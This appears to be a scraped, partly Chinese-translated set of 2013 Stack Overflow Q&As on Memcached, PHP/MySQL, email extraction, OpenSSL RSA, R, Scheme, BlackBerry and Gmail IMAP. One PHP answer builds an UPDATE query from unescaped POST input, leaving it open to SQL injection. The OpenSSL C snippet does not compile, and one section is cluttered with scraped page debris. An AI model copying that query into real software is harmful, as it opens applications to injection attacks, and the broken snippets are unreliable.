Memcached**不是**MySQL 性能插件 - 它通常用作 write-though 或 write-back[缓存](http://en.wikipedia.org/wiki/Cache_%28computing%29#Writing_policies)系统 - 通常您需要存储常用的键/值对而不访问数据库，除非它们发生更改 - 从而减少数据库的负载。

访问 Memcached 网站提供了有用的信息：

> 免费和开源、高性能、分布式内存对象缓存系统，本质上是通用的，但旨在通过减轻数据库负载来加速动态 Web 应用程序。
> 
> Memcached 是一种内存键值存储，用于存储来自数据库调用、API 调用或页面渲染结果的任意数据（字符串、对象）的小块。

超简单的伪代码示例：

```
Read:

if data in memcache {
  // Retrieve and use
} else {
  // Pull from DB, use and write to memcache
} 
```

或者，在这里，Memcached 描述了一个缓存结果的简单示例：

```
Cache Results:

function get_foo(foo_id)
    foo = memcached_get("foo:" . foo_id)
    return foo if defined foo

    foo = fetch_foo_from_database(foo_id)
    memcached_set("foo:" . foo_id, foo)
    return foo
end 
```

除非您编写软件/代码库以使用它（通常，您编写数据库函数以在访问数据库之前检查缓存），否则它不会做任何事情。值得阅读 Memcached[的缓存故事，](http://code.google.com/p/memcached/wiki/TutorialCachingStory)以了解基本的用例场景。

从历史上看，有些人将它与在 MySQL 中使用 HEAP 或内存表进行比较，但它并不相同，它可以分布在集群中的许多机器上和/或通过有可用/未分配内存可用的网络上 - 甚至在一个服务器。

如果您想了解它的规模价值，那么只需查看使用它的公司列表即可。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-28T06:39:20.613

你在找[这个](http://dev.mysql.com/doc/refman/5.6/en/innodb-memcached.html)吗？

mysql5.6现在支持memcache集成版插件。如果在这种情况下，您不需要安装另一个 memcached 服务器。只需安装 mysql 5.6。和 memcached 插件。

然后.. 正如您在该页面中看到的.. 您可以将 memacached 命令发送到 memcached 服务器，memcached 插件会自动写入您想要的备份表。

我认为应该有更多改进的一件事是表字段类型。只能使用 varchar/text/blob 类型（要与 memcached 服务器交互的备份表字段...）。

PS)

听说 memcached 插件 DML 吞吐量惊人。但是当我尝试时，我只有？进步了30%...

# php - 客户数据的 PHP MySQL 嵌套列表

> ID：15562045
> 
> 赞同：0
> 
> 时间：2013-03-22T03:09:05.550
> 
> 标签：php, mysql, html-lists

我有一个嵌套列表，它将显示客户及其电话号码，如下所示：

**杰森**

```
555 111-1111
555 222-2222 
```

**克里斯汀**

```
555 333-3333 
```

**约翰**

```
555 444-4444
555 555-5555
555 656-6666 
```

不过，我无法添加他们的电子邮件。此代码只是复制每个电话号码下的电子邮件，但我需要将电话号码和电子邮件分组在每个客户下，例如：

**杰森**

```
555 111-1111
555 222-2222
jason@jason.com
jason.alternative@jason.com 
```

**克里斯汀**

```
555 333-3333
kristen@kristen.com
kristen.alternative@kristen.com
kristen.personal@kristen.com 
```

**约翰**

```
555 444-4444
555 555-5555
555 656-6666
john@john.com 
```

PHP代码：

```
<?php
$result = mysqli_query($dbc,"
SELECT 
fname, 
phone, 
email
FROM 
customer, 
phone, 
email, 
customer_phone, 
customer_email
WHERE
customer.id=customer_phone.customer_id
AND
phone.id=customer_phone.phone_id
AND
customer.id=customer_email.customer_id
AND
email.id=customer_email.email_id
order by fname
");

$oldname = null;
while($row = mysqli_fetch_array($result))
{
    if($oldname != $row['fname'])
    {
        echo "<h3>".$row['fname']."</h3>";
        $oldname = $row['fname'];
    }
    echo "<p>".$row['phone']."</p>";
    echo "<p>".$row['email']."</p>";
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:42:01.483

此查询将通过首先获取电话号码和第二个电子邮件来将电子邮件插入电话号码之后。带有“1-Phone”和“2-Email”的列确保电子邮件在电话号码之后排序。

```
SELECT fname, '1-Phone' AS InfoType, phone AS TheInfo
  FROM Customer
  INNER JOIN phone ON phone.id=customer_phone.phone_id
  INNER JOIN customer_phone ON customer.id=customer_phone.customer_id
UNION SELECT fname, '2-Email', email
  FROM Customer
  INNER JOIN email ON email.id=customer_email.email_id
  INNER JOIN customer_email ON customer.id=customer_email.customer_id
ORDER BY fname, InfoType 
```

我将连接更改为 ANSI 语法，因为它使我更容易处理它；没有其他原因。如果这是您的偏好，请随意将连接条件推回`WHERE`子句 - 我对此感觉不强烈:)

对渲染代码的唯一更改是替换这个......

```
echo "<p>".$row['phone']."</p>";
echo "<p>".$row['email']."</p>"; 
```

... 有了这个：

```
echo "<p>".$row['TheInfo']."</p>"; 
```

# php - PHP 从一个巨大的 html 文件中提取唯一的电子邮件以放入数组中

> ID：15562052
> 
> 赞同：0
> 
> 时间：2013-03-22T03:09:53.320
> 
> 标签：php, arrays, email, preg-match

**我正在尝试将 HTML 页面中的所有唯一电子邮件放入一个数组中。**该文件很大，没有真正的模式来获取电子邮件。

这是一个名为 GetEmails.html 的示例 html --- 实际文件将包含 css 和更多要筛选的代码。在此示例中，请注意电子邮件的独特模式。简而言之，并非所有都用空格分隔，但有些用逗号和分号等分隔。

```
<html>
<body>
<p>This is some text and here is an email me@myemail.com and in this text we will see lots of emails like hello@hotmail.com; mike@hello.com, Bill@John.com or even dot orgs too like ed@wisdom.org and all types such as bill@hot.tv,mary@Mary.us and even Obama@yikes.gov some might be bold Ed@Ed.com and some will look like this Email:<strong>Ed@myemail.com</strong>
</p>
<p><u>There will be pages and pages and pages of text to sift thru so get the emails into an array.</u></p>
<p>This is some text and here is an email me@myemail.com and in this text we will see lots of emails like hello@hotmail.com; mike@hello.com, Bill@John.com or even dot orgs too like ed@wisdom.org and all types such as bill@hot.tv,mary@Mary.us and even Obama@yikes.gov some might be bold Ed@Ed.com and some will look like this Email:<strong>Ed@myemail.com</strong> and repeat This is some text and here is an email me@myemail.com and in this text we will see lots of emails like hello@hotmail.com; mike@hello.com, Bill@John.com or even dot orgs too like ed@wisdom.org and all types such as bill@hot.tv,mary@Mary.us and even Obama@yikes.gov some might be bold Ed@Ed.com and some will look like this Email:<strong>Ed@myemail.com</strong></p>
<p>&nbsp;</p>
</body>
</html> 
```

我想使用带空格的爆炸，但这可能不起作用并且可能会占用太多资源。只是想知道php中是否有一个简单的函数可以帮助我将所有电子邮件放入一个数组中。这是我尝试过的。

```
<?

$lines = file('GetEmails.html');

foreach ($lines as $line_num => $line) {

/// Finds if line has email.
   if (preg_match('/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/si', $line))
{

// Puts that line into an array
$line =  explode(" " , strip_tags($line));

// Finds if one of the itmes has an @ sign
$fl_array = preg_grep("/@/", $line);

// Puts that email in an array
$TheEmails[] = trim($fl_array);

// Puts only the unique emails an an array
$UniqueEmails= array_unique($TheEmails);

?> 
```

但是，上面的代码有效；我将使用的巨大文件恐怕它会不必要地使用资源。它也不会考虑用逗号分隔的电子邮件，例如 ed@ed.com,mike@mike.com

关于最好的方法的任何想法？**至少，即使我只能收到用空格等分隔的电子邮件，学习如何以最佳方式做到这一点也会非常有帮助......**

希望这是有道理的。非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:29:54.630

这是一个更完整的正则表达式，用于获取任何 RFC5322 有效的电子邮件地址：

[使用正则表达式验证电子邮件地址](https://stackoverflow.com/questions/201323/using-a-regular-expression-to-validate-an-email-address/1917982#1917982)

# objective-c - 如何使用 ASN.1 x509 字节数组中的 RSA 公钥加密字符串？

> ID：15562054
> 
> 赞同：0
> 
> 时间：2013-03-22T03:10:10.717
> 
> 标签：objective-c, c, openssl, x509, asn.1

我有一个 ASN.1 x509 字节数组，其中包含 RSA 对的模数和公钥。我的目标是尽一切可能使用它来加密字符串。我正在尝试在objective-c中使用openssl来实现这一点。每当我尝试使用 获取 RSA 对象`d2i_X509`时，它都会返回 null。如果我无法使用 openssl 完成此操作，我愿意切换到不同的库。请帮我找到有用的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-25T10:10:27.563

您通常不会直接使用 X.509 的公钥加密字符串。相反，您将生成一个强随机（特定质量）密钥；使用正常的对称加密（例如 AES），然后用它加密字符串。然后，您使用 X.509 加密随机密钥。

请参阅一本好的 PKI/Crypto 书籍（例如[http://www.amazon.com/Applied-Cryptography-Protocols-Algorithms-Source/dp/0471117099](https://rads.stackoverflow.com/amzn/click/com/0471117099)）了解原因（关于密钥泄漏、位翻转、填充和（重新）加密两次）。

如果你真的坚持这样做 - 看看[https://github.com/dirkx/smime-add-encryption-for-recipient/blob/master/smime-add-encrypt/main.c](https://github.com/dirkx/smime-add-encryption-for-recipient/blob/master/smime-add-encrypt/main.c)它的 pkcs7_encode_rinfo 函数。

```
x509cert = ... something to read your x509 byte array in.

unsigned char *stuff = "Some zecret string";
int stufflen = strlen(stuff);

EVP_PKEY *pkey;
EVP_PKEY_CTX *pctx = NULL;

assert(pkey =  = X509_get_pubkey( x509cert));
assert(pctx = EVP_PKEY_CTX_new(pkey, NULL));
assert(EVP_PKEY_encrypt_init(pctx)==1);
assert((EVP_PKEY_CTX_ctrl(pctx, -1, EVP_PKEY_OP_ENCRYPT
                      EVP_PKEY_CTRL_PKCS7_ENCRYPT, 0, ri)==1);

size_t eklen;
assert(EVP_PKEY_encrypt(pctx, NULL, &eklen, stuff, stufflen)==1);

ek = OPENSSL_malloc(eklen);
assert(ek);

unsigned char *ek = NULL;
assert((EVP_PKEY_encrypt(pctx, ek, &eklen, key, keylen)==1);

printf("Encrypted blurp: ");
for(int i = 0; i < eklen; i++) {
    printf("0x%02X ", ek[i];
};
printf("\n");
exit(0); 
```

# regex - 将会计数据字符串转换为整数（正数和负数）

> ID：15562056
> 
> 赞同：1
> 
> 时间：2013-03-22T03:10:38.813
> 
> 标签：regex, r

我有一个格式为 Excel 中“会计”样式的数据，看起来像`($317.40)`或`$13,645.48`. 作为一个正则表达式新手，我正在寻找一种更有效的方法来删除所有无用的符号并将带括号的字符串转换为负数。

到目前为止，我是这样做的：

```
spending$Amount <- gsub("^[(]", "-", spending$Amount)
spending$Amount <- gsub("[$]", "", spending$Amount)
spending$Amount <- gsub("[)]", "", spending$Amount)
spending$Amount <- as.numeric(gsub("[,]", "", spending$Amount)) 
```

我可以在一行中做到这一点吗？是否有专门的 R 包可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:19:40.483

嵌套`gsub`解决方案

```
x <- c("($317.40)", "$13,645.48")
as.numeric(gsub("\\(", "-", gsub("\\)|\\$|,", "", x)))
## [1]  -317.40 13645.48

## Really convoluted bad way of doing it solution 
mapply(FUN = function(x,y) ifelse(x,-1,1)*as.numeric(paste(y,collapse="")), grepl('\\(',x) ,regmatches(x, gregexpr('[0-9\\.]+',x)) ) 
```

# javascript - 无法访问某个 URL 属性 element (Javascript\jQuery) I have a problem of being unable to access data contained in the object corresponding to an -html element which is used to display another website 问问题 问问题 2013-03-22T03:10:47.767 454 次 This question shows research effort; it is useful and clear 1 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. I have a problem of being unable to access data contained in the object corresponding to an -html element which is used to display another website. The use-case scenario is that I want to display external website within my page and I want to know on which links users click (within this integrated external website) Specifically, I am interested in the URL or in the name of the document. When I try to get this data (which I can see when I browse through the object using firebug) I am unable to do it. Somehow access is restricted or I do something wrong. Here is exactly what I am doing. 1) I define an object with a wikipedia article as a data source Error: Embedded data could not be displayed. 2) I define a click event for the document in order to know when user clicks $(function() { document.onclick = myClickHandler; function myClickHandler() { // Please help to assign a string with the wikipedia article name or with the string of url of the link which was clicked to the variable articleName; var articleName; var wikiObject = $("#wikiframe"); alert('The name of the currenttly opened wiki article is: ' + articleName); } }); Now here are the problems: 1) If I click within the article, click event does not fire. 2) I cannot access the data contained in the object corresponding to this element. But there is information I need in it as you see on the screenshot. On the screenshot you see a wikipedia article which was opened by clicking on a link within the article which was first displayed. Firebug displays the information I need (in this case the URL to the article "Noumenon" Link to image displaying the properties I want to access http://img856.imageshack.us/img856/3217/informationcontainedino.png Can you please help by telling me what I need to add in order to assign articleName a string with the url of the clicked link. The whole code is here: If you click anywhere except the object click event fires. If you click on object it does not. I want the click event firing on clicking within wiki article and showing either a) the name of currently opened article OR b) the url of the clicked link Error: Embedded data could not be displayed.  Cannot upload to BlackBerry World because System.exit calls not allowed I have some problems when i try to upload my ported BAR file from Android source code: ? There were 1 imported across 1 new bundle. ? Please review your imported release for errors. ? error in opening zip file System.exit calls not allowed! ? Invalid binary file (._xxxx_xxxx9144169860289695202._xxxx_xxxx) ? Invalid binary file (.classpath8029703777285450457.classpath) ? Invalid binary file (.project6368383898458048449.project) ? Invalid binary file (AndroidManifest.xml6041251884878318023.xml) ? Invalid binary file (lint.xml4949050568352344802.xml) ? Invalid binary file (project.properties2478192746766803707.properties) ? Invalid binary file (._.classpath1279851333217904503.classpath) ? Invalid binary file (._.project4963501103302439211.project) ? Invalid binary file (._.settings6403994606986425206.settings) ? Invalid binary file (._AndroidManifest.xml7465961263356524197.xml) ? Invalid binary file (._assets7820763530849924867._assets) ? Invalid binary file (._bin4158243671404695308._bin) ? Invalid binary file (._gen1637939995840746927._gen) ? Invalid binary file (._lint.xml1798100153005616928.xml) ? Invalid binary file (._project.properties5961637973232398652.properties) ? Invalid binary file (._res6434086574236390329._res) ? Invalid binary file (._src2834477385955816881._src) ? Invalid binary file (org.eclipse.jdt.core.prefs4155356269041672159.prefs) ? Invalid binary file (._org.eclipse.jdt.core.prefs9193271982940470960.prefs) ? Invalid binary file (xxx.png3405033461431571502.png) ? Invalid binary file (xxx.png4185722626726835686.png) ? Invalid binary file (xxx.png6629508964401705944.png) ? Invalid binary file (xxx.png3951634087592980248.png) ? Invalid binary file (xxx.png6610366709435995090.png) ? Invalid binary file (xxx.png1462654443485611662.png) ? Invalid binary file (xxx.png8028919413158108187.png) ? Invalid binary file (xxx.png4161610266299604612.png) ? Invalid binary file (xxx.png5044369819175750647.png) ? Invalid binary file (xxx.png5478583367906230563.png) ? Invalid binary file (xxx.png5690369531509857973.png) ? Invalid binary file (xxx.png6665571246252631333.png) ? Invalid binary file (xxx.png3067066318731066885.png) ? Invalid binary file (xxx.png6182415731813752828.png) ? Invalid binary file (xxx.png5564879140277324991.png) ? Invalid binary file (xxx.png4168273330724460934.png) ? Invalid binary file (xxx.png7424605744156994400.png) ? Invalid binary file (xxx.png2143495245658084337.png) ? Invalid binary file (xxx.png3892067674043532572.png) ? Invalid binary file (xxx.png4328939009206690917.png) ? Invalid binary file (xxx.png7250101288947739322.png) ? Invalid binary file (xxx.png7628414616850024800.png) ? Invalid binary file (xxx.png2957123836880933253.png) ? Invalid binary file (xxx.png4353124853960754842.png) ? Invalid binary file (xxxx_03a.png7757004586244259927.png) ? Invalid binary file (xxxx_04.png5609950302680314331.png) ? Invalid binary file (xxxx_05a.png7024629859302122584.png) ? Invalid binary file (xxxx_06a.png945221159178482861.png) ? Invalid binary file (xxxx_07a.png7840661270791463333.png) ? Invalid binary file (xxxx_10a.png6537401483977947062.png) ? Invalid binary file (xxxx_11a.png4089299093947598209.png) ? Invalid binary file (xxxx_12a.png3914559505571699107.png) ? Invalid binary file (xxxx_13a.png4237917822965060007.png) ? Invalid binary file (xxxx_14a.png4420968238125384725.png) ? Invalid binary file (xxxx_16a.png4065488083709433818.png) ? Invalid binary file (xxxx_17a.png5873048186416020071.png) ? Invalid binary file (xxxx_18a.png8827417423356601674.png) ? Invalid binary file (xxxx_19a.png8070767671513894861.png) ? Invalid binary file (xxxx_20a.png6509217252450288713.png) ? Invalid binary file (xxx.png1676755072511485567.png) ? Invalid binary file (xxx.png282227566932005746.png) ? Invalid binary file (xxx.png7708237495757376660.png) ? Invalid binary file (xxx.png1138657404332473780.png) ? Invalid binary file (xxx.png8537802648820188227.png) But my bar run normally in my Playbook simulator. How can i fix this? Thanks you javascriptjqueryframehtml-object 4 0 回答 0 Related 2 c# - 从 DetailView 访问电子邮件地址 3 javascript - 用javascript删除字符 1 php - PHP字符串替换“&” 1 java - 如何从 Java 小程序获取网络活动？ 1 ruby-on-rails - 使用 Rails 和 Remotipart：上传的文件去哪里了？ 1 html - 将鼠标悬停在图像上 1 iphone - 子类uibutton中的setframe不调整框架 1 node.js - node.js mongo 连接尖峰，写入失败，连接池 1 php - 如果不总是以相同的顺序在 PHP 中解码 JSON 2 c - 分叉调用后的地址空间 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：15562059
> 
> 赞同：1
> 
> 时间：
> 
> 标签：javascript, jquery, frame, html-object

I have a problem of being unable to access data contained in the object corresponding to an `<object>`-html element which is used **to display another website**. The use-case scenario is that I want to display external website within my page and I want **to know on which links users click (within this integrated external website)**

Specifically, I am interested in the *URL* or in the *name* of the document. When I try to get this data (which I can see when I browse through the object using firebug) I am unable to do it. Somehow access is restricted or I do something wrong.

Here is exactly what I am doing.

1) I define an object with a wikipedia article as a data source

```
<object id='wikiframe' data='http://en.wikipedia.org/wiki/thing' width='100%' height='700px'> Error: Embedded data could not be displayed. </object> 
```

2) I define a click event for the document in order to know when user clicks

```
$(function() {
    document.onclick = myClickHandler;
    function myClickHandler() {
        // Please help to assign a string with the wikipedia article name or with the string of url of the link which was clicked to the variable articleName;
        var articleName;
        var wikiObject = $("#wikiframe");
        alert('The name of the currenttly opened wiki article is: ' + articleName);
    }
}); 
```

Now here are the problems:

1) If I click within the article, click event does not fire. 2) I cannot access the data contained in the object corresponding to this element. But there is information I need in it as you see on the screenshot.

On the screenshot you see a wikipedia article which was opened by clicking on a link within the article which was first displayed. Firebug displays the information I need (in this case the URL to the article "Noumenon"

[Link to image displaying the properties I want to access http://img856.imageshack.us/img856/3217/informationcontainedino.png](http://img856.imageshack.us/img856/3217/informationcontainedino.png)

Can you please help by telling me what I need to add in order to assign `articleName` a string with the url of the clicked link.

The whole code is here:

```
<!doctype html>
<html lang="en">

<head>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
</head>

<body>
    If you click anywhere except the object click event fires. If you click on object it does not. I want the click event firing on clicking within wiki article and showing either a) the name of currently opened article OR b) the url of the clicked link
    <object id='wikiframe' data='http://en.wikipedia.org/wiki/thing' width='100%' height='700px'> Error: Embedded data could not be displayed. </object>
</body>

<script>
    $(function() {
        document.onclick = myClickHandler;
        function myClickHandler() {
            // Please help to assign a string with the wikipedia article name to the variable articleName;
            var articleName;
            var wikiObject = $("#wikiframe");
            alert('The name of the currenttly opened wiki article is: ' + articleName);
        }
    });
</script>

</html> 
```

# blackberry-10 - 无法上传到 BlackBerry World，因为不允许 System.exit 调用

> ID：15562060
> 
> 赞同：0
> 
> 时间：2013-03-22T03:11:01.120
> 
> 标签：blackberry-10, blackberry-playbook, blackberry-android

当我尝试从 Android 源代码上传移植的 BAR 文件时遇到一些问题：

```
?   There were 1 imported across 1 new bundle.
?   Please review your imported release for errors.
?   error in opening zip file System.exit calls not allowed!
?   Invalid binary file (._xxxx_xxxx9144169860289695202._xxxx_xxxx)
?   Invalid binary file (.classpath8029703777285450457.classpath)
?   Invalid binary file (.project6368383898458048449.project)
?   Invalid binary file (AndroidManifest.xml6041251884878318023.xml)
?   Invalid binary file (lint.xml4949050568352344802.xml)
?   Invalid binary file (project.properties2478192746766803707.properties)
?   Invalid binary file (._.classpath1279851333217904503.classpath)
?   Invalid binary file (._.project4963501103302439211.project)
?   Invalid binary file (._.settings6403994606986425206.settings)
?   Invalid binary file (._AndroidManifest.xml7465961263356524197.xml)
?   Invalid binary file (._assets7820763530849924867._assets)
?   Invalid binary file (._bin4158243671404695308._bin)
?   Invalid binary file (._gen1637939995840746927._gen)
?   Invalid binary file (._lint.xml1798100153005616928.xml)
?   Invalid binary file (._project.properties5961637973232398652.properties)
?   Invalid binary file (._res6434086574236390329._res)
?   Invalid binary file (._src2834477385955816881._src)
?   Invalid binary file (org.eclipse.jdt.core.prefs4155356269041672159.prefs)
?   Invalid binary file (._org.eclipse.jdt.core.prefs9193271982940470960.prefs)
?   Invalid binary file (xxx.png3405033461431571502.png)
?   Invalid binary file (xxx.png4185722626726835686.png)
?   Invalid binary file (xxx.png6629508964401705944.png)
?   Invalid binary file (xxx.png3951634087592980248.png)
?   Invalid binary file (xxx.png6610366709435995090.png)
?   Invalid binary file (xxx.png1462654443485611662.png)
?   Invalid binary file (xxx.png8028919413158108187.png)
?   Invalid binary file (xxx.png4161610266299604612.png)
?   Invalid binary file (xxx.png5044369819175750647.png)
?   Invalid binary file (xxx.png5478583367906230563.png)
?   Invalid binary file (xxx.png5690369531509857973.png)
?   Invalid binary file (xxx.png6665571246252631333.png)
?   Invalid binary file (xxx.png3067066318731066885.png)
?   Invalid binary file (xxx.png6182415731813752828.png)
?   Invalid binary file (xxx.png5564879140277324991.png)
?   Invalid binary file (xxx.png4168273330724460934.png)
?   Invalid binary file (xxx.png7424605744156994400.png)
?   Invalid binary file (xxx.png2143495245658084337.png)
?   Invalid binary file (xxx.png3892067674043532572.png)
?   Invalid binary file (xxx.png4328939009206690917.png)
?   Invalid binary file (xxx.png7250101288947739322.png)
?   Invalid binary file (xxx.png7628414616850024800.png)
?   Invalid binary file (xxx.png2957123836880933253.png)
?   Invalid binary file (xxx.png4353124853960754842.png)
?   Invalid binary file (xxxx_03a.png7757004586244259927.png)
?   Invalid binary file (xxxx_04.png5609950302680314331.png)
?   Invalid binary file (xxxx_05a.png7024629859302122584.png)
?   Invalid binary file (xxxx_06a.png945221159178482861.png)
?   Invalid binary file (xxxx_07a.png7840661270791463333.png)
?   Invalid binary file (xxxx_10a.png6537401483977947062.png)
?   Invalid binary file (xxxx_11a.png4089299093947598209.png)
?   Invalid binary file (xxxx_12a.png3914559505571699107.png)
?   Invalid binary file (xxxx_13a.png4237917822965060007.png)
?   Invalid binary file (xxxx_14a.png4420968238125384725.png)
?   Invalid binary file (xxxx_16a.png4065488083709433818.png)
?   Invalid binary file (xxxx_17a.png5873048186416020071.png)
?   Invalid binary file (xxxx_18a.png8827417423356601674.png)
?   Invalid binary file (xxxx_19a.png8070767671513894861.png)
?   Invalid binary file (xxxx_20a.png6509217252450288713.png)
?   Invalid binary file (xxx.png1676755072511485567.png)
?   Invalid binary file (xxx.png282227566932005746.png)
?   Invalid binary file (xxx.png7708237495757376660.png)
?   Invalid binary file (xxx.png1138657404332473780.png)
?   Invalid binary file (xxx.png8537802648820188227.png) 
```

但我的酒吧在我的 Playbook 模拟器中正常运行。

我怎样才能解决这个问题？

谢谢

# recursion - 方案：带有列表附加的递归

> ID：15562063
> 
> 赞同：1
> 
> 时间：2013-03-22T03:11:25.053
> 
> 标签：recursion, scheme

我有一个递归函数，它基本上保持递归地将元素附加到列表中，直到满足条件。但是有一个问题，那就是使用`append`，我们必须给它一个引用列表。这样做

```
 (append (1 2) 3) 
```

给我们一个错误。

问题是当我第一次将一个列表传递给参数时，我可以把`'`它变成一个带引号的列表。但是，一旦我将某些内容附加到该列表并且它再次递归地传递给同一个函数，第二次`append`尝试工作，它将看到不再引用该列表，因此Scheme认为它是一个过程而不是一个列表。让我向您展示代码的简化版本：

```
 (define simple
   (lambda (x y)
      (if (equal? x '()) 
          (display 'success!)
          (simple (cdr x) (append y (car x)))))) 
```

我们通过do来运行函数`(simple '(1 2 3) '())` 我意识到上面的程序是没用的；这只是为了证明我在说什么。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:02:05.353

您发布的代码的问题不在于 Scheme 将过程与列表混淆了；问题在于调用`append`.

在调试时跟踪过程的执行会很有帮助。以下是我在 Petite Chez Scheme 中使用为`simple`and开启跟踪的情况下运行您的代码时显示的内容：`append``trace-define`

```
> (simple '(1 2 3) '())
|(simple (1 2 3) ())
| (append () 1)
| 1
|(simple (2 3) 1)
| (append 1 2) 
```

因为`(append () 1)`返回`1`，在第一次递归调用中`simple`，第二个参数`1`不是一个列表。因此，您在下次调用`append`.

您可以通过将`(car x)`呼叫包装在对以下内容的呼叫中来修复它`list`：

```
(define simple
  (lambda (x y)
    (if (equal? x '()) 
        (display 'success!)
        (simple (cdr x) (append y (list (car x))))))) 
```

这是运行的固定版本的跟踪：

```
> (simple '(1 2 3) '())
|(simple (1 2 3) ())
| (append () (1))
| (1)
|(simple (2 3) (1))
| (append (1) (2))
| (1 2)
|(simple (3) (1 2))
| (append (1 2) (3))
| (1 2 3)
|(simple () (1 2 3))
success!|#<void> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:51:06.937

要将元素附加到列表的末尾，请将元素放入列表中（*仅*`append`在列表之间定义）。例如，在您的代码中执行以下操作：

 *```
(append y (list (car x))) 
```

当然，这并不能改变程序没有做任何事情的事实。至少，返回累积的值`y`：

```
(define simple
  (lambda (x y)
    (if (equal? x '())
        y
        (simple (cdr x)
                (append y (list (car x))))))) 
```*

# php - Check thousands of gmail mailboxes from ~1 server

> ID：15562065
> 
> 赞同：-2
> 
> 时间：2013-03-22T03:11:51.567
> 
> 标签：php, gmail, oauth-2.0, imap, gmail-imap

I'm working on a Chrome extension that interacts both with the Gmail UI as well as Gmail's IMAP implementation.

The back-end of my app needs to monitor all incoming e-mails for each user and update the DB whenever a message/sender of interest is received.

I can set up a "user initiated" poll, where I scan all new messages whenever they have my app loaded, but there are draw backs since my app is then only up-to-date when the user is in browser. I'd like to be up to date at all times...

Off-hand I've considered a simple server poll of every user, such as:

```
For x = 0 to All users
    Fetch ALL msg where UID > lastMessageID
        if msg.sender == something i care about
            UPDATE table...
<repeat> 
```

And I've also thought about using IMAP IDLE such as:

```
For all users, establish imap idle call
    for any user whos imap idle returned
        if msg.sender == something i care about
            UPDATE table... 
```

What I'm trying to figure out though is which is going to scale better as I'll need to monitor 5-10k accounts minimum...

Is there anything I'm missing? Is there a simpler way of doing this for a large number of accounts?

*   Note, other than scanning the messages and updating a table -- I do not need to store any of the messages.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:46:22.337

实现 IDLE 是一个更好的选择，因为它也不会给服务器带来负担。

如果`Polling`它有责任`client`监控每一个变化。例如，如果从其他客户端（如 Web 界面或通过某些移动设备）删除邮件，那么要监控这种情况，您必须在每次轮询时扫描整个邮箱。

`whereas`

如果`IDLE`它有责任`Server`让您了解邮箱状态发生的任何变化，无论是邮件移动、读取还是删除操作。此外，IDLE 命令的可伸缩性也不应该是问题。

# php - Attempting to update results generated from a while loop

> ID：15562067
> 
> 赞同：0
> 
> 时间：2013-03-22T03:12:13.683
> 
> 标签：php

My main issue that I am running into is basically this:

I have a while loop that generates results from a query. With the results that have been generated, I want the ability to update the table the original query was from.

The query produces the expected results, but the table is not being updated when I click the REMOVE button. I am also trying to find a solution for the results to be updated after the UPDATE query executes...

```
<?php
    $sql = "SELECT * FROM vehicles WHERE sold='n' ORDER BY year DESC";

    $query = mysql_query($sql);

    while ($row = mysql_fetch_array($query)) { 

    echo 
    "       
        <tr>
            <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>",$row['year'],"</td>
            <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>",$row['make'],"</td>
            <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>",$row['model'],"</td>
            <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'><input type='submit' name='remove' value='REMOVE' style='background-color:#C33;color:white;padding:10px;border-radius:5px;width:70px'/></td>
        </tr>";

    if(isset($_POST['remove'])){
        $removeSql = "UPDATE `table`.`vehicles` SET `display`='0' WHERE `vin`='{$row['vin']}'";
        mysql_query($removeSql) or die('check that code dummy');
    }

    }
    mysql_close($connection);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:22:18.863

那是一个提交按钮，没有表单标签将无法工作。你不能这样做。

您可以将 写`remove code`在单独的页面上并将其转换`submit button`为`normal button`并使用.`vin id``click``button``call``ajax`

或者，如果您不知道`ajax`并且想在该页面本身上执行此操作，请按以下方式执行：

```
<?php
$sql = "SELECT * FROM vehicles WHERE sold='n' ORDER BY year DESC";

$query = mysql_query($sql);

while ($row = mysql_fetch_array($query)) { 

echo 
"       
    <tr>
        <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>",$row['year'],"</td>
        <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>",$row['make'],"</td>
        <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>",$row['model'],"</td>
        <td style='border-bottom-style:dotted;padding-top:10px;padding-bottom:10px;font-size:.9em'>
        <form action="" method="POST">
            <input type="hidden" name="vin_id" value="<?php echo $row['vin']; ?>">
            <input type='submit' name='remove' value='REMOVE' style='background-color:#C33;color:white;padding:10px;border-radius:5px;width:70px'/>
        </form></td>
    </tr>";

}

if(isset($_POST['remove'])){
    $removeSql = "UPDATE `table`.`vehicles` SET `display`='0' WHERE `vin`='".$_POST['vin_id']."'";
    mysql_query($removeSql) or die('check that code dummy');
}

mysql_close($connection);
?> 
```

# java - Comparing some parts of a file

> ID：15562073
> 
> 赞同：1
> 
> 时间：2013-03-22T03:13:14.147
> 
> 标签：java

I have a question that has been eluding me for the whole day. I want to read part of a file and compare it to other parts of same file. if I can get some kind of logic on how to collect the first set of lines and compare it with the other sets and then move to the next set and compare with the remaining until I compare every set with each other..

what I want to accomplish is this read the first 3 lines skip the next compare it with the next 3 line, skip the next and compare it with the next 3 line and after that move to the 2nd 3 lines and compare that with the 3rd set and 4th set and so on. So what am trying to do is something like

```
 for{ int i=0; i < file.lenght; i++

     for {int j=0; j=i+1; i++{

   }} 
```

but for a txt file

SAMPLE FILE

```
